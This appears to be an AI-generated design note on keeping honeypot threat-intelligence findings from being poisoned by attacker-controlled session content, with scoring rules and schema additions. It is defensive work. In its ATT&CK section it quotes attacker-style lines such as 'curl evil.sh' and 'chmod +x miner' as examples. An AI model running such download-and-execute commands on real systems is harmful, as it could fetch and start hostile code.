# Poisoned evidence — ChatGPT/Codex independent answer (2026-08-04)

## 1. Realistic Poisoning Vectors

### Sector-attribution poisoning

**Vector:** Attacker issues commands containing sector bait: `petrochemical`, `scada`, `hospital`, `dicom`, `medtech`, `sip`, `pbx`, vendor names, fake plant hostnames, fake file paths, fake credentials.

**Risk:** System over-interprets session content as evidence that the actor targets that sector.

**Mitigation with held data:**

- Do not let attacker-supplied strings determine sector attribution.
- Sector attribution should come only from sensor identity and exposure context: which honeypot profile was hit, when, from where, and whether the same actor avoided or preferred other sectors.
- Treat sector-themed commands as `attacker_claimed_sector_context`, not targeting evidence.
- Compare actor activity across all deployed sectors:
  - sector-exclusive because they only hit medtech sensors is useful;
  - sector-exclusive because they typed `hospital` is not.

**Structural rule:** command text must never upgrade sector attribution confidence.

---

### Novelty-score poisoning

**Vector:** Attacker generates weird, random, one-off command sequences to appear novel.

Examples:

- random filenames
- generated domains
- junk shell pipelines
- fake malware names
- nonsensical encoded payloads
- polymorphic command order

**Risk:** Novelty queue fills with deliberately unique garbage.

**Mitigation:**

- Split novelty into components:
  - `structural_novelty`: new behavior shape after normalization
  - `token_novelty`: new strings, filenames, domains
  - `actor_novelty`: source/ASN never seen before
  - `campaign_novelty`: coordinated behavior across sources
- Downweight token-only novelty.
- Require persistence or breadth for high priority:
  - seen across multiple sessions,
  - multiple source IPs,
  - multiple sensors,
  - or repeated over time.
- Add `novelty_decay`: one-off novelty loses priority unless repeated.

**Structural rule:** a single session with novel attacker-controlled tokens cannot create a high-confidence finding by itself.

---

### Command clustering poisoning

**Vector:** Attacker pads sessions with no-op commands, randomizes order, inserts comments, aliases, sleeps, fake failed commands, or sector-themed strings to break fingerprints or force false clusters.

**Risk:** Same campaign fragments into many clusters, or unrelated campaigns are merged by planted common tokens.

**Mitigation:**

- Normalize aggressively:
  - strip comments;
  - replace IPs, domains, URLs, hashes, paths, filenames, credentials, and long base64 blobs with typed placeholders;
  - collapse repeated commands;
  - remove known no-op padding like `id`, `uname -a`, `pwd`, excessive `echo`, `sleep`.
- Keep two fingerprints:
  - `behavior_fingerprint`: normalized command intent sequence;
  - `raw_fingerprint`: exact-ish session representation.
- Cluster on behavior fingerprint, not raw strings.
- Track manipulation indicators:
  - high entropy tokens;
  - excessive random identifiers;
  - many comments;
  - unusually long commands;
  - many failed commands;
  - obvious sector bait.

**Structural rule:** attacker-chosen identifiers must not be cluster keys.

---

### ATT&CK mapping poisoning

**Vector:** Attacker types commands that resemble specific ATT&CK techniques without actually achieving the behavior.

Examples:

- `curl evil.sh` but download fails;
- `chmod +x miner` where file does not exist;
- fake persistence paths;
- fake credential commands;
- comments like `# privilege escalation`;
- payload names like `apt_backdoor`.

**Risk:** Registry records techniques that were only theatrically implied.

**Mitigation:**

- Map ATT&CK from observed behavior states, not just command strings.
- Store mapping evidence levels:
  - `observed_success`: command succeeded or produced expected artifact/output;
  - `attempted`: command issued but failed or outcome unknown;
  - `claimed`: only present in comments, names, strings, or filenames.
- Only `observed_success` and carefully defined `attempted` techniques should count toward priority.
- Never map from comments, filenames, malware names, or actor-provided labels alone.
- Maintain allowlisted deterministic mapping rules with test cases.

**Structural rule:** ATT&CK technique evidence must distinguish attempted from successful behavior.

---

### Reputation-blind queue poisoning

**Vector:** Attacker intentionally uses clean infrastructure, cloud hosts, VPNs, residential proxies, or fresh IPs to enter the “unknown to feeds” queue.

**Risk:** “Unknown” is mistaken for “important.”

**Mitigation:**

- Treat reputation blindness as absence of external classification, not positive malicious novelty.
- Score it only when combined with:
  - repeated behavior;
  - sector concentration;
  - coordinated ASN/source activity;
  - stable behavior fingerprint;
  - operationally meaningful commands.
- Add a penalty for disposable-looking activity:
  - single session;
  - single source;
  - token-randomized;
  - no successful behavior;
  - no recurrence.

**Structural rule:** “not in feeds” must never be a standalone high-priority signal.

---

### Coordinated ASN campaign poisoning

**Vector:** Attacker uses many IPs in one ASN, or deliberately routes through an ASN to frame it.

**Risk:** The system overstates ASN-level coordination.

**Mitigation:**

- Separate:
  - `source_infrastructure`: IP/ASN observed;
  - `actor_control_inference`: inferred, lower confidence.
- Require behavioral similarity across sources before campaign grouping.
- Report “activity from ASN X” rather than “ASN X is responsible.”
- Detect suspicious coordination inflation:
  - many one-off IPs;
  - identical timing;
  - low dwell time;
  - trivial commands;
  - no repeated behavior outside one burst.

**Structural rule:** never attribute intent or control to an ASN from source IPs alone.

---

### Payload and IOC poisoning

**Vector:** Attacker plants fake domains, hashes, URLs, wallet addresses, malware family names, C2 paths, or comments.

**Risk:** Bad IOCs contaminate partner reports, OpenCTI, or OTX.

**Mitigation:**

- Classify IOCs by derivation:
  - `observed_network_fetch`;
  - `observed_file_artifact`;
  - `command_argument_only`;
  - `comment_or_label_only`.
- Export only IOCs above a minimum evidence threshold.
- Mark attacker-supplied IOCs as unverified unless successfully fetched, resolved, executed, or seen elsewhere.

**Structural rule:** do not publish comments, labels, or filenames as IOCs without explicit evidence typing.

---

## 2. Structurally Forbidden

Regardless of how convincing it looks:

- No sector attribution from attacker text.
- No actor attribution from handles, comments, banners, payload names, or claimed flags.
- No malware-family attribution from filenames or strings alone.
- No ASN responsibility claims from source ASN alone.
- No high-priority finding from a single uncorroborated session.
- No ATT&CK “success” mapping without observed effect or defined success evidence.
- No external IOC publication without evidence provenance.
- No LLM-generated facts, IDs, statuses, scores, or mappings.

---

## 3. Registry Schema Additions

Add poisoning-aware fields to `findings`:

```sql
poisoning_risk TEXT CHECK(poisoning_risk IN ('low','medium','high','critical')),
poisoning_reasons JSON NOT NULL DEFAULT '[]',
evidence_strength TEXT CHECK(evidence_strength IN ('single','repeated','cross_source','cross_sensor','cross_sector')),
attacker_controlled_evidence BOOLEAN NOT NULL DEFAULT 0,
corroboration_level TEXT CHECK(corroboration_level IN ('none','internal_repeat','internal_cross_sensor','external')),
export_eligible BOOLEAN NOT NULL DEFAULT 0,
export_restrictions JSON NOT NULL DEFAULT '[]'
```

Add evidence-level records:

```sql
finding_evidence(
  finding_id,
  evidence_type,
  value,
  source_session_id,
  attacker_controlled BOOLEAN,
  observation_mode TEXT,
  confidence_contribution REAL,
  poisoning_flags JSON
)
```

Useful `poisoning_flags`:

- `sector_bait_terms`
- `token_only_novelty`
- `single_session_only`
- `randomized_tokens`
- `comment_claim`
- `failed_command`
- `asn_framing_risk`
- `ioc_argument_only`
- `no_external_corroboration`

---

## 4. Confidence Model

Use two separate scores:

```text
analytic_confidence = how likely the finding describes real observed behavior
poisoning_resistance = how hard it would be for an attacker to fabricate this signal
```

Priority should be gated by both.

Example:

```text
priority = impact_score
         + recurrence_score
         + sector_concentration_score
         + coordination_score
         + behavior_novelty_score
         - poisoning_penalty
```

Hard gates:

- `poisoning_risk = critical` caps confidence at low.
- `single_session_only + attacker_controlled_evidence` caps priority at medium or lower.
- `reputation_blind` adds no score unless corroborated by behavior or recurrence.
- `sector_exclusive` only counts if based on sensor targeting, not session content.

---

## 5. Internal vs External Output

### Internal briefs

Can include speculative or fragile findings, but label them explicitly:

- “high poisoning risk”
- “single-session”
- “attacker-controlled strings present”
- “not externally corroborated”
- “sector exclusivity based on sensor hit pattern”

Internal users can act with caution, hunt for recurrence, tune sensors, or request enrichment.

### Partner reports

Require stricter thresholds:

- repeated or cross-source evidence;
- clear provenance;
- no sector claims from attacker text;
- no actor attribution unless independently supported;
- include confidence and caveats.

Phrase defensively:

```text
We observed activity from sources in ASN X against medtech-profile sensors.
```

Not:

```text
ASN X is targeting hospitals.
```

### OpenCTI / OTX

Use the strictest export policy.

Only export:

- observed IOCs with provenance;
- behavior patterns with evidence level;
- ATT&CK mappings marked as attempted or observed;
- confidence scores;
- first_seen / last_seen;
- source type as honeypot telemetry.

Do not export:

- fake flags;
- comments;
- claimed actor names;
- inferred sector intent from command text;
- single-session novelty as a campaign;
- unverified payload labels as malware family names.

The core design principle: attacker-controlled content can describe what the attacker typed, but it cannot by itself describe who they are, what sector they targeted, what malware they used, or how important the finding is.
